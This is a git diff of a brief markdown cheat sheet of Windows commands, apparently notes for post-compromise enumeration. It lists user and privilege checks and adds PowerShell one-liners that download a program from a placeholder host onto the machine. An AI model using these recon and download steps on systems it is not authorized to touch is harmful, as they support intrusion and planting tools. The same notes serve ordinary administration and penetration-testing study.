@@ -3,6 +3,8 @@ powershell.exe
 
 ## then the obvious:-
 whoami<br />
+echo %username% (if whoami doesnt work) ONLY FOR CMD NOT FOR POWERSHELL<br />
+$ENV:USERNAME (if whoami doesnt work) ONLY FOR POWERSHELL NOT FOR CMD<br />
 whoami /priv<br />
 net user<br />
 net localgroup Administrators<br />
@@ -18,5 +20,6 @@ tasklist<br />
 
 
 ## To Download somthing from the internet or intranet:-
-powershell.exe -command (New-Object System.Net.Webclient).DownloadFile("http://'ip address/domain:port'/'file path from the root dir of server'","'download location's full path'\'programname.extension'")
-**Everything in this command is without the single quote**
+powershell.exe -command (New-Object System.Net.Webclient).DownloadFile("http://ip address/domain:port/file","download location's full path\programname.extension")<br />
+powershell Invoke-Webrequest -OutFile 'Dstn path.Extension' -Uri http://ip address/domain:port/file
+
